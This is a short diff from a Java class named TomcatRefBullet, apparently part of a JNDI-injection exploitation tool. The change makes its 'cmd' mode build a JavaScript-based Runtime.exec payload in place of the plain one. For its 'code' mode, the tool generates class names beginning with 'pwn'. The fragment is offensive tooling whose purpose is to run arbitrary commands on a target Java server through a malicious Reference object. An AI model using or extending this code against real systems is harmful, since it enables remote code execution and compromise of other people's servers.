@@ -40,7 +40,7 @@ public class TomcatRefBullet extends AbstractBullet<Reference> {
     public Reference getObject() throws Exception {
         String data;
         if(type.equals("cmd")) {
-            data = getPayload(PayloadHelper.makeRuntimeExecPayload(body));
+            data = getPayload(PayloadHelper.makeJsRuntimeExecPayload(body));
         }else if(type.equals("code")) {
             if(classname == null){
                 classname = "pwn"+System.currentTimeMillis();
